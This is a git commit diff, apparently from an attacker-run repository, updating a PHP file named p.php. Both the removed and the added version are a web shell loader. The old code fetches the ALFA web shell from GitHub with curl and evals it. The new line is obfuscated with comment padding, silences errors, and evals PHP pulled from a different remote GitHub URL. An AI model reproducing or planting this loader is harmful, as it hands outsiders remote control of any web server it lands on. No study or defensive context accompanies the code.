21413a42ea66cfb3abfd05ccada7f02ed9511aa0
ZuanXploit <166925481+ZuanXploit@users.noreply.github.com>
2024-11-09 20:47:30 +0700

    Update p.php

--- p.php
+++ p.php
@@ -1,17 +1,1 @@
-<?php
-function getCurl0($url)
-{
-  if (function_exists("curl_init")) {
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-    $result = curl_exec($ch);
-    curl_close($ch);
-    return $result;
-  }
-}
-?>
-
-<?=eval("?>".getCurl0("curl https://raw.githubusercontent.com/Ravin-Academy/DeObfuscation_ALFA_SHELL_V4.1/refs/heads/main/Decode%20Of%20ALFA%20Team/alfa-shell-v4.1-tesla-decoded.php")); __halt_compiler();?>
+<?=/****/@/*55555*/null; /******/@/*55555*/error_reporting(0);/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/CynthiaAngelika/kuantekong/main/index.php"))/******/?>
